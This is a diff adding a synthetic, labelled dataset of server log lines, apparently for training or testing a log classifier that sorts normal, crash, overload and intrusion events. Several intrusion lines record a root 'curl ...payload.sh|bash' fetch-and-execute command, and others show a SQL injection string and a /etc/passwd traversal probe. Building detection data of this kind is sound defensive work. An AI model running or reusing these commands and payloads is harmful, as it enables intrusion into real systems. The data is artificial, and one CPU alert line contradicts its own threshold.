@@ -1,0 +1,200 @@
+{"service": "kernel", "message": "netfilter: nf_tables: port scan from 188.160.60.62: 1629 SYN packets/s", "label": "intrusion"}
+{"service": "nginx", "message": "GET /health HTTP/1.1\" 200 373 \"-\" \"kube-probe/1.25\"", "label": "normal"}
+{"service": "sshd", "message": "Accepted password for root from 198.172.66.145 \u2014 unusual foreign IP, SIEM alert raised", "label": "intrusion"}
+{"service": "kernel", "message": "EXT4-fs error (device sdb1): ext4_find_entry: reading directory lblock 0 \u2014 filesystem corrupted", "label": "crash"}
+{"service": "systemd", "message": "docker.service: Failed with result 'core-dump'. Attempting restart...", "label": "crash"}
+{"service": "Apache/2.4", "message": "[core:error] AH00052: child pid 92211 exit signal Segmentation fault (11) \u2014 worker terminated", "label": "crash"}
+{"service": "CloudWatch", "message": "GuardDuty: UnauthorizedAccess:EC2/SSHBruteForce from 210.39.67.152 to node-03.prod.cluster \u2014 HIGH severity", "label": "intrusion"}
+{"service": "alertmanager", "message": "Alert resolved: HostHighCpuLoad on gateway-01 \u2014 cpu back to 20.0%", "label": "normal"}
+{"service": "kubelet", "message": "Pod db-6640 CrashLoopBackOff: back-off 5m0s restarting failed container", "label": "crash"}
+{"service": "kube-apiserver", "message": "etcd cluster is unavailable \u2014 apiserver shutting down. Check etcd health on gateway-01", "label": "crash"}
+{"service": "HDFS", "message": "DataNode master-01.k8s heartbeat missed for 30s \u2014 marking as dead, replicating 6442 blocks", "label": "crash"}
+{"service": "kubelet", "message": "Pod default/backend-7528 is running", "label": "normal"}
+{"service": "Apache/2.4", "message": "220.253.100.118 - - [2025-03-16T09:17:10.352Z] \"POST /wp-admin/setup-config.php HTTP/1.1\" 403 0 \u2014 exploit attempt", "label": "intrusion"}
+{"service": "kernel", "message": "kernel: segfault at 7f000004122 ip 00007f1293000 sp 00007f1067000 error 4 in libc.so", "label": "crash"}
+{"service": "sshd", "message": "Accepted password for root from 193.224.149.213 \u2014 unusual foreign IP, SIEM alert raised", "label": "intrusion"}
+{"service": "kubelet", "message": "Pod worker-7098 CrashLoopBackOff: back-off 5m0s restarting failed container", "label": "crash"}
+{"service": "kernel", "message": "netfilter: nf_tables: port scan from 187.121.107.208: 1859 SYN packets/s", "label": "intrusion"}
+{"service": "kube-scheduler", "message": "Successfully assigned default/redis-2697 to web-server-01", "label": "normal"}
+{"service": "kubelet", "message": "Pod evicted on worker-02.k8s due to memory pressure: memory.available<100Mi threshold", "label": "overload"}
+{"service": "HDFS", "message": "BlockReport from queue-01: total blocks=32138, missing=0, corrupt=0", "label": "normal"}
+{"service": "systemd", "message": "etcd.service: Main process exited, code=killed, status=11/SEGV", "label": "crash"}
+{"service": "cadvisor", "message": "Container spark-worker memory usage 92.4% exceeds limit 90%", "label": "overload"}
+{"service": "nginx", "message": "GET /health HTTP/1.1\" 200 327 \"-\" \"kube-probe/1.25\"", "label": "normal"}
+{"service": "cadvisor", "message": "Container spark-worker memory usage 98.4% exceeds limit 90%", "label": "overload"}
+{"service": "Apache/2.4", "message": "[mpm_event:error] Server reached MaxRequestWorkers=375, consider raising the value", "label": "overload"}
+{"service": "Apache/2.4", "message": "190.225.233.1 - - [2025-03-01T16:08:28.978Z] \"GET /search?q=1%27+OR+%271%27%3D%271 HTTP/1.1\" 400 0 \u2014 SQLi attempt", "label": "intrusion"}
+{"service": "sshd", "message": "New connection from unknown host 183.179.143.153 \u2014 not in allowlist, flagged by IDS", "label": "intrusion"}
+{"service": "sshd", "message": "Maximum authentication attempts exceeded for invalid user admin from 190.225.179.185", "label": "intrusion"}
+{"service": "HDFS", "message": "NameNode heartbeat received from DataNode gateway-01 at 2025-03-21", "label": "normal"}
+{"service": "cron", "message": "(root) CMD (/usr/bin/backup.sh > /dev/null 2>&1)", "label": "normal"}
+{"service": "cron", "message": "(root) CMD (/usr/bin/backup.sh > /dev/null 2>&1)", "label": "normal"}
+{"service": "PAM", "message": "pam_unix(sshd:auth): authentication failure; user=root rhost=193.96.200.76", "label": "intrusion"}
+{"service": "kube-scheduler", "message": "Insufficient cpu: 0/3 nodes available. Requested 4000m, Allocatable 3800m", "label": "overload"}
+{"service": "systemd", "message": "Watchdog triggered shutdown: java-worker.service unresponsive for 60s on auth-server-01", "label": "crash"}
+{"service": "cadvisor", "message": "Container metrics collected: cpu=19.1%, mem=22.0% for pod/redis", "label": "normal"}
+{"service": "Prometheus", "message": "AlertManager: HostHighCpuLoad - node-02.prod.cluster CPU=90.1% > threshold 85% for 5m", "label": "overload"}
+{"service": "HDFS", "message": "DataNode web-server-01 heartbeat missed for 30s \u2014 marking as dead, replicating 9749 blocks", "label": "crash"}
+{"service": "HDFS", "message": "HDFS Block replicated successfully blk_1149460439 on queue-01", "label": "normal"}
+{"service": "alertmanager", "message": "Alert resolved: HostHighCpuLoad on master-01.k8s \u2014 cpu back to 34.7%", "label": "normal"}
+{"service": "HDFS", "message": "NameNode heartbeat received from DataNode gateway-01 at 2025-03-12", "label": "normal"}
+{"service": "cron", "message": "(root) CMD (/usr/bin/backup.sh > /dev/null 2>&1)", "label": "normal"}
+{"service": "kube-apiserver", "message": "Throttling request to the apiserver: too many requests. cpu=96.0% on node-01.prod.cluster", "label": "overload"}
+{"service": "CloudWatch", "message": "High NetworkIn: 112478 bytes/s on api-server-01 \u2014 threshold exceeded", "label": "overload"}
+{"service": "CloudWatch", "message": "EC2 Instance hdfs-datanode-01 status check FAILED: system status check \u2014 possible underlying hardware issue", "label": "crash"}
+{"service": "kernel", "message": "kernel: BUG: unable to handle kernel NULL pointer dereference at 0000000000000000 \u2014 host=node-01.prod.cluster", "label": "crash"}
+{"service": "nginx", "message": "GET /health HTTP/1.1\" 200 235 \"-\" \"kube-probe/1.25\"", "label": "normal"}
+{"service": "Apache/2.4", "message": "[mpm_event:error] Server reached MaxRequestWorkers=343, consider raising the value", "label": "overload"}
+{"service": "nginx", "message": "worker_connections 973 are not enough while connecting to upstream", "label": "overload"}
+{"service": "alertmanager", "message": "Alert resolved: HostHighCpuLoad on web-server-01 \u2014 cpu back to 31.1%", "label": "normal"}
+{"service": "etcd", "message": "Compacted raft log: index=41850", "label": "normal"}
+{"service": "Apache/2.4", "message": "10.0.1.169 - - [2025-03-03T14:51:03.421Z] \"GET /static/app.js HTTP/1.1\" 304 0", "label": "normal"}
+{"service": "nginx", "message": "GET /health HTTP/1.1\" 200 217 \"-\" \"kube-probe/1.25\"", "label": "normal"}
+{"service": "Apache/2.4", "message": "184.7.134.56 - - [2025-03-04T02:01:08.701Z] \"GET /etc/passwd HTTP/1.1\" 404 196 \u2014 directory traversal attempt", "label": "intrusion"}
+{"service": "kernel", "message": "kswapd0: high swap usage 87.5% \u2014 memory pressure on hdfs-namenode-01", "label": "overload"}
+{"service": "cadvisor", "message": "Container spark-worker memory usage 93.6% exceeds limit 90%", "label": "overload"}
+{"service": "kube-apiserver", "message": "Request completed: GET /api/v1/namespaces/default/pods 200 in 50ms", "label": "normal"}
+{"service": "Apache/2.4", "message": "10.0.5.108 - admin [2025-03-13T23:33:37.218Z] \"POST /api/v1/data HTTP/1.1\" 200 512", "label": "normal"}
+{"service": "HDFS", "message": "BlockReport from cache-01: total blocks=45843, missing=0, corrupt=0", "label": "normal"}
+{"service": "node_exporter", "message": "CPU usage: 19.2% | Memory: 35.9% | Disk: 15.8%", "label": "normal"}
+{"service": "kubelet", "message": "Pod db-8520 CrashLoopBackOff: back-off 5m0s restarting failed container", "label": "crash"}
+{"service": "kernel", "message": "kernel: segfault at 7f000008869 ip 00007f4271000 sp 00007f2589000 error 4 in libc.so", "label": "crash"}
+{"service": "kernel", "message": "kernel: segfault at 7f000009561 ip 00007f7874000 sp 00007f2843000 error 4 in libc.so", "label": "crash"}
+{"service": "sshd", "message": "Accepted password for root from 200.192.143.210 \u2014 unusual foreign IP, SIEM alert raised", "label": "intrusion"}
+{"service": "HDFS", "message": "DataNode auth-server-01 heartbeat missed for 30s \u2014 marking as dead, replicating 9367 blocks", "label": "crash"}
+{"service": "systemd", "message": "Watchdog triggered shutdown: java-worker.service unresponsive for 60s on node-04.prod.cluster", "label": "crash"}
+{"service": "Apache/2.4", "message": "10.0.1.121 - admin [2025-03-20T09:22:18.445Z] \"POST /api/v1/data HTTP/1.1\" 200 512", "label": "normal"}
+{"service": "systemd", "message": "kafka.service: Main process exited, code=killed, status=11/SEGV", "label": "crash"}
+{"service": "systemd", "message": "Started nginx.service successfully", "label": "normal"}
+{"service": "sshd", "message": "Failed password for root from 196.113.113.115 port 62624 ssh2 - attempt 37", "label": "intrusion"}
+{"service": "systemd", "message": "docker.service: Failed with result 'core-dump'. Attempting restart...", "label": "crash"}
+{"service": "HDFS", "message": "NameNode heartbeat received from DataNode db-server-01 at 2025-03-20", "label": "normal"}
+{"service": "auditd", "message": "type=EXECVE: suspicious execve('/bin/bash','-c','curl http://204.45.52.27/payload.sh|bash') uid=0", "label": "intrusion"}
+{"service": "node_exporter", "message": "CPU spike detected: 92.7% utilization on hdfs-namenode-01, load average: 14.78", "label": "overload"}
+{"service": "alertmanager", "message": "Alert resolved: HostHighCpuLoad on worker-01.k8s \u2014 cpu back to 33.3%", "label": "normal"}
+{"service": "Apache/2.4", "message": "10.0.1.54 - - [2025-03-14T09:45:17.968Z] \"GET /static/app.js HTTP/1.1\" 304 0", "label": "normal"}
+{"service": "HDFS", "message": "DataNode hdfs-namenode-01 heartbeat missed for 30s \u2014 marking as dead, replicating 9797 blocks", "label": "crash"}
+{"service": "cadvisor", "message": "Container spark-worker memory usage 92.7% exceeds limit 90%", "label": "overload"}
+{"service": "Prometheus", "message": "AlertManager: HostHighCpuLoad - node-03.prod.cluster CPU=95.0% > threshold 85% for 5m", "label": "overload"}
+{"service": "kube-apiserver", "message": "Throttling request to the apiserver: too many requests. cpu=97.6% on gateway-01", "label": "overload"}
+{"service": "kernel", "message": "kernel: BUG: unable to handle kernel NULL pointer dereference at 0000000000000000 \u2014 host=web-server-01", "label": "crash"}
+{"service": "auditd", "message": "type=USER_LOGIN msg=audit(2025-03-13T06:46:15.659Z): user=deploy terminal=ssh res=success", "label": "normal"}
+{"service": "cadvisor", "message": "Container metrics collected: cpu=26.6%, mem=51.9% for pod/postgres", "label": "normal"}
+{"service": "kubelet", "message": "Pod evicted on master-01.k8s due to memory pressure: memory.available<100Mi threshold", "label": "overload"}
+{"service": "kernel", "message": "EXT4-fs error (device sdb1): ext4_find_entry: reading directory lblock 0 \u2014 filesystem corrupted", "label": "crash"}
+{"service": "Prometheus", "message": "Scrape successful for target http://api-server-01:9090/metrics in 71ms", "label": "normal"}
+{"service": "kernel", "message": "kswapd0: high swap usage 98.4% \u2014 memory pressure on web-server-02", "label": "overload"}
+{"service": "Apache/2.4", "message": "10.0.1.87 - - [2025-03-06T11:45:02.586Z] \"GET /static/app.js HTTP/1.1\" 304 0", "label": "normal"}
+{"service": "HDFS", "message": "BlockReport from gateway-01: total blocks=46406, missing=0, corrupt=0", "label": "normal"}
+{"service": "kubelet", "message": "Pod worker-1731 CrashLoopBackOff: back-off 5m0s restarting failed container", "label": "crash"}
+{"service": "alertmanager", "message": "CRITICAL: CPUUtilization=92.2% on auth-server-01 exceeds 95% for 10 consecutive minutes", "label": "overload"}
+{"service": "node_exporter", "message": "Disk I/O error on /dev/sda1: input/output error \u2014 possible hardware disk failure on hdfs-datanode-01", "label": "crash"}
+{"service": "sshd", "message": "New connection from unknown host 211.160.198.157 \u2014 not in allowlist, flagged by IDS", "label": "intrusion"}
+{"service": "cadvisor", "message": "Container spark-worker memory usage 90.4% exceeds limit 90%", "label": "overload"}
+{"service": "kubelet", "message": "Pod default/postgres-8172 is running", "label": "normal"}
+{"service": "auth", "message": "Brute force attack detected from 202.132.85.96: 135 failed login attempts in 60s", "label": "intrusion"}
+{"service": "kubelet", "message": "Pod backend-2481 CrashLoopBackOff: back-off 5m0s restarting failed container", "label": "crash"}
+{"service": "kube-apiserver", "message": "Throttling request to the apiserver: too many requests. cpu=96.0% on cache-01", "label": "overload"}
+{"service": "HDFS", "message": "FATAL: NameNode cannot start. Block pool ID mismatch: expected BP-534212844 got unknown", "label": "crash"}
+{"service": "kernel", "message": "kernel: segfault at 7f000006211 ip 00007f8417000 sp 00007f5455000 error 4 in libc.so", "label": "crash"}
+{"service": "node_exporter", "message": "Disk I/O wait: 89.2% iowait on worker-01.k8s \u2014 storage bottleneck", "label": "overload"}
+{"service": "HDFS", "message": "BlockReport from node-03.prod.cluster: total blocks=30004, missing=0, corrupt=0", "label": "normal"}
+{"service": "Prometheus", "message": "AlertManager: HostHighCpuLoad - web-server-02 CPU=92.6% > threshold 85% for 5m", "label": "overload"}
+{"service": "sshd", "message": "Failed password for root from 189.216.193.19 port 57510 ssh2 - attempt 37", "label": "intrusion"}
+{"service": "cadvisor", "message": "Container metrics collected: cpu=17.1%, mem=29.8% for pod/postgres", "label": "normal"}
+{"service": "Apache/2.4", "message": "10.0.5.227 - admin [2025-03-16T13:54:20.981Z] \"POST /api/v1/data HTTP/1.1\" 200 512", "label": "normal"}
+{"service": "HDFS", "message": "DataNode hdfs-datanode-01 heartbeat missed for 30s \u2014 marking as dead, replicating 4350 blocks", "label": "crash"}
+{"service": "node_exporter", "message": "Disk I/O wait: 71.6% iowait on hdfs-datanode-02 \u2014 storage bottleneck", "label": "overload"}
+{"service": "sshd", "message": "Accepted publickey for deploy from 10.0.1.35 port 44090 ssh2", "label": "normal"}
+{"service": "HDFS", "message": "HDFS Block replicated successfully blk_2051802512 on node-04.prod.cluster", "label": "normal"}
+{"service": "auditd", "message": "type=SYSCALL: sudo privilege escalation by uid=1001 to root \u2014 suspicious context from 206.30.141.222", "label": "intrusion"}
+{"service": "Apache/2.4", "message": "10.0.1.43 - - [2025-03-13T13:01:22.426Z] \"GET /api/endpoint HTTP/1.1\" 500 0 Internal Server Error", "label": "crash"}
+{"service": "auditd", "message": "type=USER_LOGIN msg=audit(2025-03-03T05:43:46.592Z): user=deploy terminal=ssh res=success", "label": "normal"}
+{"service": "Apache/2.4", "message": "[mpm_event:error] Server reached MaxRequestWorkers=363, consider raising the value", "label": "overload"}
+{"service": "auth", "message": "Brute force attack detected from 194.147.86.200: 78 failed login attempts in 60s", "label": "intrusion"}
+{"service": "Apache/2.4", "message": "127.0.0.1 - - [2025-03-23T12:28:53.213Z] \"GET /index.html HTTP/1.1\" 200 6234", "label": "normal"}
+{"service": "etcd", "message": "Compacted raft log: index=21300", "label": "normal"}
+{"service": "auditd", "message": "type=SYSCALL: sudo privilege escalation by uid=1001 to root \u2014 suspicious context from 216.39.254.117", "label": "intrusion"}
+{"service": "Apache/2.4", "message": "127.0.0.1 - - [2025-03-19T04:56:42.661Z] \"GET /index.html HTTP/1.1\" 200 7158", "label": "normal"}
+{"service": "systemd", "message": "Started prometheus.service successfully", "label": "normal"}
+{"service": "sshd", "message": "Accepted password for root from 196.42.190.171 \u2014 unusual foreign IP, SIEM alert raised", "label": "intrusion"}
+{"service": "kubelet", "message": "Pod evicted on master-01.k8s due to memory pressure: memory.available<100Mi threshold", "label": "overload"}
+{"service": "HDFS", "message": "BlockReport from web-server-01: total blocks=10670, missing=0, corrupt=0", "label": "normal"}
+{"service": "auditd", "message": "type=SYSCALL: sudo privilege escalation by uid=1001 to root \u2014 suspicious context from 217.196.179.247", "label": "intrusion"}
+{"service": "kubelet", "message": "Pod default/postgres-6554 is running", "label": "normal"}
+{"service": "sshd", "message": "Failed password for root from 213.23.205.18 port 50180 ssh2 - attempt 25", "label": "intrusion"}
+{"service": "kernel", "message": "kernel: segfault at 7f000006301 ip 00007f1975000 sp 00007f1359000 error 4 in libc.so", "label": "crash"}
+{"service": "nginx", "message": "worker_connections 838 are not enough while connecting to upstream", "label": "overload"}
+{"service": "cadvisor", "message": "Container metrics collected: cpu=18.6%, mem=34.8% for pod/postgres", "label": "normal"}
+{"service": "HDFS", "message": "HDFS Block replicated successfully blk_3389142017 on master-01.k8s", "label": "normal"}
+{"service": "Apache/2.4", "message": "185.59.72.90 - - [2025-03-05T11:20:10.525Z] \"POST /wp-admin/setup-config.php HTTP/1.1\" 403 0 \u2014 exploit attempt", "label": "intrusion"}
+{"service": "sshd", "message": "New connection from unknown host 187.116.1.12 \u2014 not in allowlist, flagged by IDS", "label": "intrusion"}
+{"service": "sshd", "message": "Failed password for root from 195.29.125.23 port 41803 ssh2 - attempt 24", "label": "intrusion"}
+{"service": "HDFS", "message": "HDFS Block replicated successfully blk_2178758213 on node-03.prod.cluster", "label": "normal"}
+{"service": "kubelet", "message": "Pod default/redis-8025 is running", "label": "normal"}
+{"service": "PAM", "message": "pam_unix(sshd:auth): authentication failure; user=root rhost=193.105.142.193", "label": "intrusion"}
+{"service": "Apache/2.4", "message": "127.0.0.1 - - [2025-03-14T18:58:08.351Z] \"GET /index.html HTTP/1.1\" 200 4806", "label": "normal"}
+{"service": "Apache/2.4", "message": "217.1.47.188 - - [2025-03-20T09:33:19.435Z] \"GET /etc/passwd HTTP/1.1\" 404 196 \u2014 directory traversal attempt", "label": "intrusion"}
+{"service": "Prometheus", "message": "Scrape successful for target http://api-server-01:9090/metrics in 191ms", "label": "normal"}
+{"service": "cron", "message": "(root) CMD (/usr/bin/backup.sh > /dev/null 2>&1)", "label": "normal"}
+{"service": "systemd", "message": "Watchdog triggered shutdown: java-worker.service unresponsive for 60s on gateway-01", "label": "crash"}
+{"service": "Apache/2.4", "message": "10.0.1.120 - - [2025-03-25T03:53:25.142Z] \"GET /static/app.js HTTP/1.1\" 304 0", "label": "normal"}
+{"service": "node_exporter", "message": "CPU spike detected: 88.4% utilization on api-server-01, load average: 16.02", "label": "overload"}
+{"service": "Apache/2.4", "message": "10.0.1.248 - - [2025-03-14T23:41:51.426Z] \"GET /static/app.js HTTP/1.1\" 304 0", "label": "normal"}
+{"service": "Prometheus", "message": "Scrape successful for target http://hdfs-datanode-01:9090/metrics in 91ms", "label": "normal"}
+{"service": "alertmanager", "message": "Alert resolved: HostHighCpuLoad on node-04.prod.cluster \u2014 cpu back to 32.1%", "label": "normal"}
+{"service": "HDFS", "message": "HDFS Block replicated successfully blk_1241030242 on node-01.prod.cluster", "label": "normal"}
+{"service": "CloudWatch", "message": "GuardDuty: UnauthorizedAccess:EC2/SSHBruteForce from 218.69.153.83 to hdfs-datanode-02 \u2014 HIGH severity", "label": "intrusion"}
+{"service": "alertmanager", "message": "Alert resolved: HostHighCpuLoad on gateway-01 \u2014 cpu back to 36.5%", "label": "normal"}
+{"service": "CloudWatch", "message": "GuardDuty: UnauthorizedAccess:EC2/SSHBruteForce from 220.137.212.97 to web-server-02 \u2014 HIGH severity", "label": "intrusion"}
+{"service": "kube-apiserver", "message": "etcd cluster is unavailable \u2014 apiserver shutting down. Check etcd health on node-03.prod.cluster", "label": "crash"}
+{"service": "systemd", "message": "Service tomcat.service: Watchdog timeout (limit 30s), memory=84.6%", "label": "overload"}
+{"service": "kernel", "message": "kswapd0: high swap usage 77.0% \u2014 memory pressure on node-02.prod.cluster", "label": "overload"}
+{"service": "alertmanager", "message": "CRITICAL: CPUUtilization=93.8% on hdfs-datanode-02 exceeds 95% for 10 consecutive minutes", "label": "overload"}
+{"service": "cron", "message": "(root) CMD (/usr/bin/backup.sh > /dev/null 2>&1)", "label": "normal"}
+{"service": "auditd", "message": "type=EXECVE: suspicious execve('/bin/bash','-c','curl http://206.114.164.64/payload.sh|bash') uid=0", "label": "intrusion"}
+{"service": "node_exporter", "message": "Disk I/O error on /dev/sda1: input/output error \u2014 possible hardware disk failure on hdfs-namenode-01", "label": "crash"}
+{"service": "systemd", "message": "Started postgres.service successfully", "label": "normal"}
+{"service": "systemd", "message": "postgres.service: Main process exited, code=killed, status=11/SEGV", "label": "crash"}
+{"service": "node_exporter", "message": "Disk I/O error on /dev/sda1: input/output error \u2014 possible hardware disk failure on db-server-01", "label": "crash"}
+{"service": "systemd", "message": "Started nginx.service successfully", "label": "normal"}
+{"service": "sshd", "message": "Failed password for root from 199.124.237.95 port 46403 ssh2 - attempt 39", "label": "intrusion"}
+{"service": "auth", "message": "Brute force attack detected from 182.225.111.254: 58 failed login attempts in 60s", "label": "intrusion"}
+{"service": "kube-apiserver", "message": "Request completed: GET /api/v1/namespaces/default/pods 200 in 42ms", "label": "normal"}
+{"service": "kube-apiserver", "message": "Throttling request to the apiserver: too many requests. cpu=93.0% on node-04.prod.cluster", "label": "overload"}
+{"service": "Apache/2.4", "message": "10.0.1.248 - - [2025-03-04T23:51:26.969Z] \"GET /static/app.js HTTP/1.1\" 304 0", "label": "normal"}
+{"service": "kernel", "message": "kswapd0: high swap usage 81.1% \u2014 memory pressure on node-03.prod.cluster", "label": "overload"}
+{"service": "kubelet", "message": "Pod default/frontend-4824 is running", "label": "normal"}
+{"service": "HDFS", "message": "NameNode heartbeat received from DataNode hdfs-namenode-01 at 2025-03-23", "label": "normal"}
+{"service": "kernel", "message": "netfilter: nf_tables: port scan from 209.118.207.162: 4182 SYN packets/s", "label": "intrusion"}
+{"service": "kernel", "message": "kernel: BUG: unable to handle kernel NULL pointer dereference at 0000000000000000 \u2014 host=worker-01.k8s", "label": "crash"}
+{"service": "alertmanager", "message": "Alert resolved: HostHighCpuLoad on gateway-01 \u2014 cpu back to 11.5%", "label": "normal"}
+{"service": "kube-apiserver", "message": "Request completed: GET /api/v1/namespaces/default/pods 200 in 70ms", "label": "normal"}
+{"service": "systemd", "message": "Started redis.service successfully", "label": "normal"}
+{"service": "auditd", "message": "type=USER_LOGIN msg=audit(2025-03-05T09:55:21.957Z): user=deploy terminal=ssh res=success", "label": "normal"}
+{"service": "etcd", "message": "Compacted raft log: index=94343", "label": "normal"}
+{"service": "cron", "message": "(root) CMD (/usr/bin/backup.sh > /dev/null 2>&1)", "label": "normal"}
+{"service": "systemd", "message": "Service tomcat.service: Watchdog timeout (limit 30s), memory=87.7%", "label": "overload"}
+{"service": "HDFS", "message": "FATAL: NameNode cannot start. Block pool ID mismatch: expected BP-728751749 got unknown", "label": "crash"}
+{"service": "systemd", "message": "Started prometheus.service successfully", "label": "normal"}
+{"service": "CloudWatch", "message": "High NetworkIn: 102308 bytes/s on cache-01 \u2014 threshold exceeded", "label": "overload"}
+{"service": "auditd", "message": "type=SYSCALL: sudo privilege escalation by uid=1001 to root \u2014 suspicious context from 185.55.127.169", "label": "intrusion"}
+{"service": "kube-scheduler", "message": "Insufficient cpu: 0/3 nodes available. Requested 4000m, Allocatable 3800m", "label": "overload"}
+{"service": "HDFS", "message": "HDFS Block replicated successfully blk_8838002637 on hdfs-datanode-02", "label": "normal"}
+{"service": "kernel", "message": "kernel: segfault at 7f000006500 ip 00007f8317000 sp 00007f1186000 error 4 in libc.so", "label": "crash"}
+{"service": "kernel", "message": "kswapd0: high swap usage 86.4% \u2014 memory pressure on node-03.prod.cluster", "label": "overload"}
+{"service": "Prometheus", "message": "AlertManager: HostHighCpuLoad - hdfs-namenode-01 CPU=92.0% > threshold 85% for 5m", "label": "overload"}
+{"service": "auditd", "message": "type=SYSCALL: sudo privilege escalation by uid=1001 to root \u2014 suspicious context from 215.253.209.176", "label": "intrusion"}
+{"service": "kernel", "message": "netfilter: nf_tables: port scan from 214.78.142.22: 3700 SYN packets/s", "label": "intrusion"}
+{"service": "Apache/2.4", "message": "220.88.85.126 - - [2025-03-19T01:12:40.598Z] \"POST /wp-admin/setup-config.php HTTP/1.1\" 403 0 \u2014 exploit attempt", "label": "intrusion"}
+{"service": "node_exporter", "message": "Disk I/O error on /dev/sda1: input/output error \u2014 possible hardware disk failure on hdfs-datanode-02", "label": "crash"}
+{"service": "kernel", "message": "Out of memory: Kill process 2204 (java) score 542 or sacrifice child", "label": "overload"}
+{"service": "Apache/2.4", "message": "127.0.0.1 - - [2025-03-05T12:21:47.347Z] \"GET /index.html HTTP/1.1\" 200 3377", "label": "normal"}
+{"service": "cadvisor", "message": "Container metrics collected: cpu=9.8%, mem=59.0% for pod/postgres", "label": "normal"}
+{"service": "node_exporter", "message": "CPU usage: 17.6% | Memory: 30.6% | Disk: 36.9%", "label": "normal"}
+{"service": "Prometheus", "message": "Scrape successful for target http://cache-01:9090/metrics in 183ms", "label": "normal"}
+{"service": "HDFS", "message": "HDFS Block replicated successfully blk_2784572192 on node-03.prod.cluster", "label": "normal"}
+{"service": "kube-scheduler", "message": "Successfully assigned default/postgres-4340 to cache-01", "label": "normal"}
+{"service": "auditd", "message": "type=SYSCALL: sudo privilege escalation by uid=1001 to root \u2014 suspicious context from 213.6.184.240", "label": "intrusion"}
+{"service": "auditd", "message": "type=EXECVE: suspicious execve('/bin/bash','-c','curl http://182.58.11.218/payload.sh|bash') uid=0", "label": "intrusion"}
+{"service": "Apache/2.4", "message": "[mpm_event:error] Server reached MaxRequestWorkers=276, consider raising the value", "label": "overload"}
